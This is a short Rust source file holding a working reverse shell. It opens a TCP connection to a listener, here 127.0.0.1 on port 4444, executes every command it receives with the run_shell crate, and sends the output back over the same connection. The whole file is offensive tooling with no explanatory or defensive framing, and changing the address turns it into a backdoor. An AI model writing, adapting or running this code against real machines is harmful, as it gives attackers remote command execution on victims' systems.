use std::net::TcpStream;
use std::process;
use std::io::{Read, Write};
use std::str::from_utf8;

use run_shell::*;

fn main() {
    let ip: &str = "127.0.0.1";
    let port: i32 = 4444;

    let mut buff = [0; 1024];

    match TcpStream::connect(&format!("{}:{}", ip, port)) {
        Ok(mut stream) => {
            loop {
                let len = stream.read(&mut buff).unwrap();
                
                let shell = cmd!(from_utf8(&buff[0..len]).unwrap()).stdout_utf8().unwrap();

                stream.write(&shell.as_bytes());

            }
        },

        Err(_) => {
            process::exit(0);

        },
    }
}